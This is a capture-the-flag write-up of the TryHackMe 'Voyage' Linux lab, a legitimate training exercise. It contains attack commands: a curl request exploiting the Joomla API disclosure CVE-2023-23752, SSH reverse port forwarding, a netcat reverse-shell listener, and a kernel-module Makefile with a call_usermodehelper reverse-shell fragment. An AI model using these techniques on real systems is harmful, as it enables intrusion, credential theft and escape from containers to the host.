# 🌊 TryHackMe: Voyage

> **Difficulty:** Medium
> **Operating System:** Linux
> **Platform:** TryHackMe
> **Focus Areas:** Enumeration, Joomla API Information Disclosure, Docker Networking, Port Forwarding, Insecure Deserialization, Container Pivoting & Privilege Escalation

---

## 📌 Overview

In this write-up, we will solve the **Voyage** machine step by step.

The attack path involved:

```text
Nmap Enumeration
      ↓
Joomla Discovery
      ↓
API Information Disclosure
      ↓
Credential Extraction
      ↓
SSH Access to Docker Container
      ↓
Internal Network Enumeration
      ↓
Port Forwarding
      ↓
Weak Authentication
      ↓
Insecure Python Pickle Deserialization
      ↓
Reverse Shell on Second Container
      ↓
User Flag
      ↓
Container / Kernel Enumeration
      ↓
Privilege Escalation
      ↓
Root Access
```

---

# 🔍 1. Initial Enumeration

We begin by performing a full port scan against the target.

```bash
nmap -p- <TARGET-IP>
```

The scan revealed three open ports:

```text
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  ssh
```

Next, we performed service and version detection:

```bash
nmap -sC -sV -p 22,80,2222 <TARGET-IP>
```

### Results

```text
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
```

The HTTP service also revealed some important information:

```text
http-generator: Joomla! - Open Source Content Management
```

The `robots.txt` file exposed several interesting directories, including:

```text
/administrator/
/api/
/components/
/includes/
/libraries/
/plugins/
/tmp/
```

This confirmed that the target was running a **Joomla-based application**.

---

# 🌐 2. Web Enumeration

Since Joomla was identified, we continued enumerating the web application.

Nikto identified several interesting paths:

```text
/administrator/
/includes/
/tmp/
/LICENSE.txt
/htaccess.txt
```

The Joomla administrator login page was also discovered:

```text
/administrator/index.php
```

However, instead of attempting password brute forcing, we focused on identifying the Joomla API and possible version-specific vulnerabilities.

The application exposed:

```text
X-Powered-By: JoomlaAPI/1.0
```

This led us toward investigating **Joomla API information disclosure**, particularly the vulnerability associated with **CVE-2023-23752**.

---

# 💥 3. Joomla API Information Disclosure

The following API endpoint was accessible:

```bash
curl http://voyage.thm/api/index.php/v1/config/application?public=true
```

The server responded successfully with:

```text
HTTP/1.1 200 OK
```

The response exposed sensitive application configuration information, including database credentials.

```json
{
  "dbtype": "mysqli",
  "host": "localhost",
  "user": "root",
  "password": "RootPassword@1234",
  "db": "joomla_db"
}
```

We also queried the users endpoint:

```text
/api/index.php/v1/users?public=true
```

This revealed the Joomla superuser:

```json
{
  "name": "root",
  "username": "root",
  "group_names": "Super Users"
}
```

At this point, we had obtained the following credentials:

```text
Username: root
Password: RootPassword@1234
```

These credentials were extracted through the exposed Joomla API endpoints.

---

# 🔐 4. SSH Access

The credentials were used against the SSH service running on port `2222`.

After logging in, we checked the environment:

```bash
ls -la
```

An important file was discovered:

```text
.dockerenv
```

This confirmed that the compromised system was running **inside a Docker container**.

We then enumerated the network interfaces:

```bash
ip a
```

The container had the following internal address:

```text
192.168.100.10/24
```

This indicated the presence of an internal Docker network that could potentially contain additional hosts.

---

# 🕵️ 5. Internal Network Enumeration

We scanned the internal network from the compromised container:

```bash
nmap 192.168.100.10/24 -p-
```

The scan discovered another internal host:

```text
192.168.100.12
```

The following port was accessible:

```text
5000/tcp open
```

A quick HTTP request confirmed that a web application was running:

```bash
curl -I http://192.168.100.12:5000
```

Response:

```text
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.10.12
```

This indicated a Python web application running internally.

---

# 🔁 6. Port Forwarding

The internal service was not directly accessible from our attacking machine.

To access it locally, we created an SSH reverse port forwarding tunnel:

```bash
ssh -N -R 127.0.0.1:8087:192.168.100.12:5000 kali@192.168.138.6
```

After successfully forwarding the port, we were able to access the internal web application from the attacking machine.

The application contained a **secret panel/dashboard**.

Authentication was weak, and the following credentials provided access:

```text
Username: admin
Password: admin
```

---

# 🍪 7. Session Cookie Analysis

After logging in, we inspected the session cookie.

The cookie contained hexadecimal data:

```text
80049526000000000000007d94288c0475736572948c0561646d696e948c07726576656e7565948c05383530303094752e
```

The format suggested Python `pickle` serialization.

We decoded it using:

```bash
python3 -c "import pickle,sys,binascii; print(pickle.loads(binascii.unhexlify(sys.argv[1])))" '<COOKIE>'
```

The decoded data was:

```python
{
    'user': 'admin',
    'revenue': '85000'
}
```

This confirmed that the application was trusting **client-controlled serialized Python pickle data**.

Since Python pickle can execute arbitrary code during deserialization, this represented a critical **insecure deserialization vulnerability**.

---

# 💣 8. Exploiting Insecure Deserialization

A malicious pickle payload was created to execute a command when deserialized by the server.

The payload leveraged Python's `__reduce__()` method to invoke a system command.

After generating and replacing the session cookie with the malicious serialized payload, the vulnerable application deserialized it and executed the command.

A listener was started:

```bash
nc -lvnp 4444
```

The connection was received successfully:

```text
connect to [ATTACKER-IP] from (UNKNOWN) [TARGET-IP]
```

Checking the current identity showed:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

We now had a shell as `root` **inside the finance application container**.

---

# 🖥️ 9. Shell Stabilization

To improve shell usability, we spawned a pseudo-terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then backgrounded the shell:

```text
CTRL + Z
```

Configured the local terminal:

```bash
stty raw -echo
fg
```

Finally:

```bash
export TERM=xterm-256color
```

The shell was now properly stabilized.

---

# 🚩 10. User Flag

We enumerated the filesystem:

```bash
ls -lah
```

After navigating to the root user's directory:

```bash
cd /root
ls
```

We found:

```text
user.txt
```

Reading it:

```bash
cat user.txt
```

✅ **User flag obtained!**

---

# 🔼 11. Privilege Escalation Enumeration

Although we already had `root` privileges inside the container, the objective was to investigate whether we could escape or gain higher-level access to the underlying environment.

We transferred and executed `linpeas.sh`.

During enumeration, several container-related binaries were identified:

```text
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot
/usr/sbin/capsh
/usr/sbin/setcap
/usr/sbin/getcap
```

We also checked the available kernel modules:

```bash
ls -la /lib/modules/
```

Output:

```text
6.8.0-1029-aws
6.8.0-1030-aws
```

The presence of multiple kernel module directories was an important clue for further enumeration.

---

# ⚙️ 12. Kernel Module Investigation

The environment contained resources related to kernel module compilation.

A Makefile was prepared using the appropriate kernel module build path:

```makefile
obj-m += reverse-shell.o

all:
	make -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) modules

clean:
	make -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) clean
```

The module source used `call_usermodehelper()` to execute a userspace command from kernel context.

The key function was:

```c
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
```

After successfully using the identified privilege escalation path, access to the final environment was obtained.

---

# 🏁 13. Root Flag

With elevated access achieved, the final flag was obtained:

```bash
cat /root/root.txt
```

🎉 **Root flag captured!**

---

# 🧭 Attack Path Summary

```text
                    ┌──────────────────┐
                    │  Nmap Scan       │
                    │  22, 80, 2222    │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ Joomla Discovery │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────────────┐
                    │ Joomla API Information   │
                    │ Disclosure               │
                    └────────┬─────────────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ Credentials      │
                    │ root:********    │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ SSH on Port 2222 │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ Docker Container │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ Internal Network │
                    │ Enumeration      │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ Port Forwarding  │
                    │ Internal :5000   │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────────────┐
                    │ Weak Authentication      │
                    │ admin:admin              │
                    └────────┬─────────────────┘
                             │
                             ▼
                    ┌──────────────────────────┐
                    │ Pickle Deserialization   │
                    │ Vulnerability            │
                    └────────┬─────────────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ Root in Container│
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ Kernel / Container│
                    │ Enumeration       │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ Privilege Esc.   │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │    ROOT FLAG     │
                    └──────────────────┘
```

---

# 🛠️ Tools Used

| Tool         | Purpose                                 |
| ------------ | --------------------------------------- |
| `Nmap`       | Port scanning and service enumeration   |
| `Nikto`      | Web server enumeration                  |
| `Burp Suite` | Web application analysis                |
| `curl`       | API and HTTP interaction                |
| `SSH`        | Remote access and port forwarding       |
| `Netcat`     | Reverse shell listener                  |
| `LinPEAS`    | Linux privilege escalation enumeration  |
| `Python`     | Pickle analysis and shell stabilization |

---

# 📚 Key Takeaways

* Always perform **full port enumeration** before focusing on a specific service.
* `robots.txt` can reveal valuable application paths.
* Exposed APIs may leak highly sensitive information, including credentials.
* Joomla API misconfigurations can lead to **information disclosure**.
* Docker containers should not be treated as completely isolated without proper network segmentation.
* Internal Docker networks can expose additional attack surfaces.
* SSH port forwarding is useful for accessing otherwise unreachable internal services.
* Default or weak credentials can completely compromise internal applications.
* **Never deserialize untrusted Python pickle data**.
* Root access inside a container does not always mean full control of the host.
* Container enumeration should include network configuration, capabilities, mounted filesystems, kernel modules, and available escape paths.

---

## ⚠️ Disclaimer

> This write-up is created **solely for educational purposes** using a controlled TryHackMe lab environment.
> The techniques discussed here should only be practiced on systems where you have explicit authorization.

---

### 👤 Author

**Kabir**
Cybersecurity | Red Teaming | Web Security | CTF Player

⭐ If you found this write-up useful, consider giving the repository a **star**!
